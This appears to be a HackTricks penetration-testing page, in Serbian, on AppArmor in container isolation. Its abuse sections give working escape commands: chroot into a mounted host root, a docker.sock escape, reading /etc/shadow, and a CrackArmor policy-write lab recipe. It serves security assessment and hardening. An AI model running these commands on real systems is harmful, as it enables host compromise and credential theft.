# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

AppArmor je sistem **obavezne kontrole pristupa** koji primenjuje ograničenja pomoću profila za svaki program. Za razliku od tradicionalnih DAC provera, koje u velikoj meri zavise od vlasništva korisnika i grupa, AppArmor omogućava kernelu da sprovodi pravila vezana za sam proces. U kontejnerskim okruženjima to je važno jer radno opterećenje može imati dovoljno tradicionalnih privilegija da pokuša neku radnju, a ipak biti odbijeno zato što njegov AppArmor profil ne dozvoljava odgovarajuću putanju, montiranje, mrežno ponašanje ili korišćenje capability-ja.

Najvažnije je razumeti da se AppArmor zasniva na **putanjama**. Pristup sistemu datoteka određuje pomoću pravila za putanje, a ne pomoću oznaka, kao što to radi SELinux. Zbog toga je pristupačan i moćan, ali i znači da bind mounts i alternativni rasporedi putanja zahtevaju pažljivu procenu. Ako isti sadržaj sa hosta postane dostupan preko druge putanje, efekat pravila možda neće biti onakav kakav je operator očekivao.

## Role In Container Isolation

Provere bezbednosti kontejnera često se zaustavljaju na capabilities i seccomp-u, ali AppArmor je i dalje važan nakon tih provera. Zamislite kontejner sa više privilegija nego što bi trebalo da ima ili radno opterećenje kojem je iz operativnih razloga bila potrebna još jedna capability. AppArmor i dalje može da ograniči pristup datotekama, ponašanje pri montiranju, umrežavanje i obrasce izvršavanja na načine koji zaustavljaju očigledan put zloupotrebe. Zato isključivanje AppArmor-a „samo da bi aplikacija radila“ može neprimetno da pretvori konfiguraciju koja je samo rizična u konfiguraciju koja se aktivno može iskoristiti.

## Lab

Da biste proverili da li je AppArmor aktivan na hostu, koristite:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Da biste videli pod kojim se profilom trenutno izvršava proces kontejnera:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Razlika je poučna. U uobičajenom slučaju, proces bi trebalo da prikazuje AppArmor kontekst povezan sa profilom koji je izabrao runtime. U slučaju bez ograničenja, taj dodatni sloj ograničenja nestaje.

Možete da proverite i šta Docker smatra da je primenio:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Upotreba tokom izvršavanja

Docker može da primeni podrazumevani ili prilagođeni AppArmor profil ako ga host podržava. Podman takođe može da se integriše sa AppArmor-om na sistemima zasnovanim na AppArmor-u, mada na distribucijama koje prvenstveno koriste SELinux drugi MAC sistem često ima glavnu ulogu. Kubernetes može da izloži AppArmor politiku na nivou workload-a na čvorovima koji zaista podržavaju AppArmor. LXC i srodna okruženja za sistemske kontejnere iz Ubuntu porodice takođe u velikoj meri koriste AppArmor.

Praktično gledano, AppArmor nije „funkcija Docker-a“. To je funkcija jezgra hosta koju više runtime okruženja može da primeni. Ako host ne podržava AppArmor ili je runtime podešen da radi bez ograničenja, navodna zaštita zapravo ne postoji.

Konkretno za Kubernetes, savremeni API je `securityContext.appArmorProfile`. Od Kubernetes verzije `v1.30`, starije beta AppArmor anotacije su zastarele. Na podržanim hostovima, `RuntimeDefault` je podrazumevani profil, dok `Localhost` upućuje na profil koji već mora biti učitan na čvoru. Ovo je važno tokom pregleda jer manifest može delovati kao da podržava AppArmor, a da se i dalje u potpunosti oslanja na podršku na strani čvora i unapred učitane profile.<sup>[[1]](#references)</sup>

Jedan suptilan, ali koristan operativni detalj jeste da je eksplicitno podešavanje `appArmorProfile.type: RuntimeDefault` strože od pukog izostavljanja tog polja. Ako je polje eksplicitno podešeno, a čvor ne podržava AppArmor, admission bi trebalo da bude odbijen. Ako je polje izostavljeno, workload i dalje može da se pokrene na čvoru bez AppArmor-a, samo bez tog dodatnog sloja ograničenja. Iz perspektive napadača, ovo je dobar razlog da proveri i manifest i stvarno stanje čvora.<sup>[[1]](#references)</sup>

Na hostovima sa AppArmor podrškom za Docker, najpoznatiji podrazumevani profil je `docker-default`. Taj profil se generiše iz Moby AppArmor predloška i važan je zato što objašnjava zašto neki PoC-ovi zasnovani na capabilities i dalje ne uspevaju u podrazumevanom kontejneru. Uopšteno, `docker-default` dozvoljava uobičajeno umrežavanje, zabranjuje upis u veliki deo direktorijuma `/proc`, uskraćuje pristup osetljivim delovima direktorijuma `/sys`, blokira mount operacije i ograničava ptrace tako da ne može da služi za opšte ispitivanje hosta. Razumevanje tog osnovnog podešavanja pomaže da razlikujete „kontejner ima `CAP_SYS_ADMIN`“ od „kontejner zaista može da iskoristi tu capability za pristup interfejsima jezgra koji su mi bitni“.

## Upravljanje profilima

AppArmor profili se obično čuvaju u direktorijumu `/etc/apparmor.d/`. Uobičajena konvencija imenovanja je zamena kosih crta u putanji izvršne datoteke tačkama. Na primer, profil za `/usr/bin/man` obično se čuva kao `/etc/apparmor.d/usr.bin.man`. Ovaj detalj je važan i pri odbrani i pri proceni, jer nakon što saznate naziv aktivnog profila, često možete brzo da pronađete odgovarajuću datoteku na hostu.

Korisne komande za upravljanje sa strane hosta uključuju:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Razlog zbog kog su ove komande važne u priručniku za bezbednost kontejnera jeste to što objašnjavaju kako se profili zaista prave, učitavaju, prebacuju u complain mode i menjaju nakon izmena aplikacije. Ako operater ima naviku da tokom rešavanja problema prebaci profile u complain mode i zaboravi da ponovo uključi enforcement, kontejner u dokumentaciji može delovati zaštićeno, dok se u stvarnosti ponaša mnogo manje restriktivno.

### Pravljenje i ažuriranje profila

`aa-genprof` može da prati ponašanje aplikacije i da interaktivno pomogne u pravljenju profila:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` može da generiše predložak profila koji se kasnije može učitati pomoću `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Kada se binarna datoteka promeni i pravila treba ažurirati, `aa-logprof` može ponovo da obradi odbijanja zabeležena u logovima i pomogne operateru da odluči da li da ih dozvoli ili odbije:

```bash
sudo aa-logprof
```

### Dnevnici

AppArmor odbijanja često su vidljiva kroz `auditd`, syslog ili alate kao što je `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Ovo je korisno u operativnom radu i ofanzivnim aktivnostima. Branioci ga koriste za unapređivanje profila. Napadači ga koriste da otkriju koja se tačno putanja ili operacija blokira i da li je AppArmor kontrola koja zaustavlja exploit chain.

### Utvrđivanje tačne datoteke profila

Kada runtime prikaže određeni naziv AppArmor profila za kontejner, često je korisno povezati taj naziv sa datotekom profila na disku:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Ovo je naročito korisno tokom pregleda sa strane hosta jer premošćuje jaz između „kontejner navodi da radi pod profilom `lowpriv`“ i „stvarna pravila nalaze se u ovoj konkretnoj datoteci, koju je moguće pregledati ili ponovo učitati“.

### Pravila sa važnim implikacijama koja treba proveriti

Kada možete da pročitate profil, nemojte se zaustaviti na jednostavnim linijama `deny`. Nekoliko tipova pravila značajno utiče na to koliko će AppArmor biti efikasan u zaštiti od pokušaja container escape:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: izvršava ciljnu binarnu datoteku bez ograničenja. Ako je pomoćni program, shell ili interpreter do kog se može doći dozvoljen uz `ux`, to je obično prva stvar koju treba testirati.
- `px` / `Px` i `cx` / `Cx`: prilikom izvršavanja obavljaju prelaze između profila. To nije automatski loše, ali vredi proveriti jer prelaz može da vodi do profila koji je mnogo manje restriktivan od trenutnog.
- `change_profile`: omogućava zadatku da pređe na drugi učitani profil, odmah ili pri sledećem izvršavanju. Ako je odredišni profil slabiji, ovo može postati predviđeni izlaz iz restriktivne domene.
- `flags=(complain)`, `flags=(unconfined)` ili noviji `flags=(prompt)`: ovo treba da utiče na to koliko poverenja imate u profil. `complain` beleži odbijanja umesto da ih sprovodi, `unconfined` uklanja granicu, a `prompt` zavisi od putanje odlučivanja u userspace-u, umesto isključivo od odbijanja koje sprovodi kernel.
- `userns` ili `userns create,`: novija AppArmor pravila mogu da kontrolišu kreiranje korisničkih imenskih prostora. Ako ih profil kontejnera izričito dozvoljava, ugnježdeni korisnički imenski prostori i dalje su mogući, čak i kada platforma koristi AppArmor kao deo svoje strategije ojačavanja bezbednosti.

Korisna `grep` komanda za pokретање sa strane hosta:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Ova vrsta provere često je korisnija nego pregledanje stotina uobičajenih pravila za fajlove. Ako breakout zavisi od izvršavanja pomoćnog programa, ulaska u novi namespace ili prelaska u manje restriktivan profil, odgovor se često krije u ovim pravilima za prelaze, a ne u očiglednim linijama poput `deny /etc/shadow r`.

## Pogrešne konfiguracije

Najočiglednija greška je `apparmor=unconfined`. Administratori je često postavljaju dok otklanjaju greške u aplikaciji kojoj je profil ispravno blokirao nešto opasno ili neočekivano. Ako zastavica ostane u produkciji, ceo MAC sloj je praktično uklonjen.

Još jedan suptilan problem je pretpostavka da su bind mountovi bezopasni zato što dozvole za fajlove izgledaju uobičajeno. Pošto se AppArmor zasniva na putanjama, izlaganje putanja hosta pod alternativnim lokacijama montiranja može loše da se uklopi sa pravilima za putanje. Treća greška je zaboravljanje da naziv profila u konfiguracionom fajlu malo znači ako kernel hosta zapravo ne sprovodi AppArmor.

## Zloupotreba

Kada AppArmor više nije aktivan, operacije koje su ranije bile ograničene mogu iznenada da uspeju: čitanje osetljivih putanja kroz bind mountove, pristup delovima procfs-a ili sysfs-a koje je trebalo da bude teže koristiti, izvršavanje radnji povezanih s montiranjem ako ih capabilities/seccomp takođe dozvoljavaju ili korišćenje putanja koje bi profil inače zabranio. AppArmor je često razlog zbog kog pokušaj breakout-a zasnovan na capabilities, koji bi „trebalo da uspe“ na papiru, ipak ne uspeva u praksi. Uklonite AppArmor i isti pokušaj može početi da uspeva.

Ako sumnjate da je AppArmor glavna prepreka lancu zloupotrebe zasnovanom na path traversal-u, bind mountu ili montiranju, prvi korak je obično da uporedite šta postaje dostupno sa profilom i bez njega. Na primer, ako je putanja hosta montirana unutar containera, prvo proverite da li možete da joj pristupite i čitate je:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Ako kontejner takođe ima opasnu capability kao što je `CAP_SYS_ADMIN`, jedan od najpraktičnijih testova jeste da proverite da li je AppArmor kontrola koja blokira mount operacije ili pristup osetljivim kernel fajl-sistemima:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

U okruženjima u kojima je putanja sa hosta već dostupna putem bind mount-a, gubitak AppArmor zaštite može takođe da pretvori problem otkrivanja informacija uz pristup samo za čitanje u direktan pristup datotekama na hostu:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Svrha ovih komandi nije da AppArmor sam po sebi omogući bekstvo iz kontejnera. Poenta je da se, kada se AppArmor ukloni, odmah može testirati mnoštvo puteva zloupotrebe zasnovanih na filesystem-u i mount-ovima.

### Potpun primer: AppArmor onemogućen + root direktorijum hosta montiran

Ako je root direktorijum hosta već bind-mountovan na `/host`, uklanjanje AppArmor-a može pretvoriti blokirani put zloupotrebe filesystem-a u potpuno bekstvo na host:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Kada se shell izvršava preko datotečnog sistema hosta, radno opterećenje je praktično pobeglo iz granica kontejnera:

```bash
id
hostname
cat /etc/shadow | head
```

### Potpun primer: AppArmor je onemogućen + Runtime Socket

Ako je stvarna prepreka bio AppArmor oko runtime stanja, montirani socket može biti dovoljan za potpuni escape:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Tačna putanja zavisi od tačke montiranja, ali krajnji rezultat je isti: AppArmor više ne sprečava pristup runtime API-ju, a runtime API može da pokrene kontejner koji ugrožava host.

### Potpun primer: Zaobilaženje zaštite bind-mount-om zasnovane na putanji

Pošto je AppArmor zasnovan na putanjama, zaštita za `/proc/**` ne štiti automatski isti sadržaj host procfs-a kada mu se može pristupiti preko druge putanje:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Uticaj zavisi od toga šta je tačno montirano i od toga da li alternativna putanja zaobilazi i druge kontrole, ali ovaj obrazac je jedan od najjasnijih razloga zbog kojih AppArmor treba procenjivati zajedno sa rasporedom montiranja, a ne zasebno.

### Full Example: Shebang Bypass

AppArmor može da pridruži profil putanji izvršene skripte, a ne interpreteru navedenom u njenom shebangu. Nasuprot tome, direktno pozivanje interpretera može da izabere profil tog interpretera. [Ovu razliku opisuje održavalac AppArmor-a](https://bugs.launchpad.net/apparmor/+bug/1911431). Istorijski primer obuhvatao je skriptu čija prva linija upućuje na ograničeni interpreter:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Primer je samo kandidat kod kog mogućnost interpretera za rad sa capabilities može postati efektivna i stvarni exec attachment skripte dozvoljava operaciju. Proverite učitanu policy i oznaku procesa, capability bounding set, `no_new_privs` i stanje `nosuid` za mount; samo ime profile fajla ili listing `cap_setuid+ep` ne dokazuju da je moguća upotrebljiva tranzicija. Lanci interpretera i alternativni putevi izvršavanja zahtevaju zasebnu proveru.

## Policy-control fajlovi kao privilegovani primitiv za upis

Na pogođenim AppArmor kernelima, neprivilegovani korisnik može otvoriti securityfs fajl `.load`, `.replace` ili `.remove` za upis, ali direktan `write()` ne uspeva jer se dozvola za administriranje policy proverava u trenutku upisa. Ako setuid helper nasledi taj descriptor kao stdout ili stderr i upiše bajtove koje kontroliše napadač, kernel koristi credentials helpera. Time helper postaje *privilegovani writer* policy podataka, a ne način da pozivalac generalno dobije root. Qualys je pokazao da `su -P` može proslediti bajtove iz komande pokrenute kao isti korisnik preko svog privilegovanog PTY puta; za taj način potrebna je lozinka podešena za korisnički nalog. Proverite ispravke za instalirani kernel i `su`, umesto da world-writable dozvole fajla smatrate dokazom izloženosti.<sup>[[3]](#references)[[4]](#references)</sup>

U disposable lab okruženju sa pogođenim kernelom i helperom, ovim se kreira pa uklanja testni profil. Shell otvara svaki control fajl pre nego što `su` upiše u njega; `stty raw` sprečava da PTY relay izmeni bajtove kompajliranog profila. Nemojte pokretati test nad production profilom.<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

Isti primitiv može da zameni postojeći profil. Na primer, profil koji dozvoljava `userns` za pokretač može da ukloni AppArmor ograničenje za user namespace, ali ne daje host-root kapabilitete; i dalje su važna stvarna sysctl podešavanja za namespace i druge kontrole. Takođe može da ukloni ograničenja za ciljni proces. Pregledajte [provere izloženosti kernela](../../../main-system-information/kernel-vulnerability-assessment.md) i [pregled Linux Hardening-a](../../../) da biste videli širi tok rada za eskalaciju privilegija.<sup>[[3]](#references)[[4]](#references)</sup>

## Provere

Cilj ovih provera je da brzo odgovore na tri pitanja: da li je AppArmor omogućen na hostu, da li je trenutni proces ograničen i da li je runtime zaista primenio profil na ovaj kontejner?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Šta je ovde zanimljivo:

- Ako `/proc/self/attr/current` prikazuje `unconfined`, radno opterećenje nema koristi od AppArmor ograničenja.
- Ako `aa-status` prikazuje da je AppArmor onemogućen ili nije učitan, bilo koji naziv profila u konfiguraciji runtime okruženja uglavnom je samo kozmetički.
- Ako `docker inspect` prikazuje `unconfined` ili neočekivani prilagođeni profil, to je često razlog zbog kog funkcioniše put zloupotrebe zasnovan na filesystem-u ili mount-u.
- Ako `/sys/kernel/security/apparmor/profiles` ne sadrži profil koji ste očekivali, konfiguracija runtime okruženja ili orkestratora sama po sebi nije dovoljna.
- Ako navodno ojačani profil sadrži pravila kao što su `ux`, široko definisani `change_profile`, `userns` ili `flags=(complain)`, stvarna granica zaštite može biti mnogo slabija nego što naziv profila sugeriše.

Ako kontejner već ima povišene privilegije iz operativnih razloga, to što je AppArmor i dalje omogućen često pravi razliku između kontrolisanog izuzetka i mnogo šireg bezbednosnog propusta.

## Podrazumevane postavke runtime okruženja

| Runtime okruženje / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeni načini ručnog slabljenja zaštite |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano omogućen na hostovima koji podržavaju AppArmor | Koristi AppArmor profil `docker-default`, osim ako nije drugačije podešeno | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zavisi od hosta | AppArmor je podržan preko `--security-opt`, ali tačno podrazumevano ponašanje zavisi od hosta/runtime okruženja i nije univerzalno kao dokumentovani Docker profil `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Uslovno podrazumevano ponašanje | Ako `appArmorProfile.type` nije naveden, podrazumevana vrednost je `RuntimeDefault`, ali se primenjuje samo kada je AppArmor omogućen na čvoru | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` sa slabim profilom, čvorovi bez podrške za AppArmor |
| containerd / CRI-O pod Kubernetes-om | Zavisi od podrške čvora/runtime okruženja | Uobičajena runtime okruženja koja podržava Kubernetes podržavaju AppArmor, ali stvarna primena i dalje zavisi od podrške čvora i postavki radnog opterećenja | Isto kao u redu za Kubernetes; direktna konfiguracija runtime okruženja takođe može potpuno da preskoči AppArmor |

Kod AppArmor-a, najvažnija promenljiva često je **host**, a ne samo runtime okruženje. Postavka profila u manifestu ne obezbeđuje ograničavanje na čvoru na kom AppArmor nije omogućen.



## References

- [1] [Kubernetes bezbednosni kontekst: polja AppArmor profila i ponašanje u zavisnosti od podrške čvora](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns` i oznake profila](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
- [3] [Qualys tehničko upozorenje o CrackArmor-u](https://cdn2.qualys.com/advisory/2026/03/10/crack-armor.txt)
- [4] [Ubuntu baza znanja o ranjivosti CrackArmor](https://ubuntu.com/security/vulnerabilities/crackarmor)
{{#include ../../../../banners/hacktricks-training.md}}
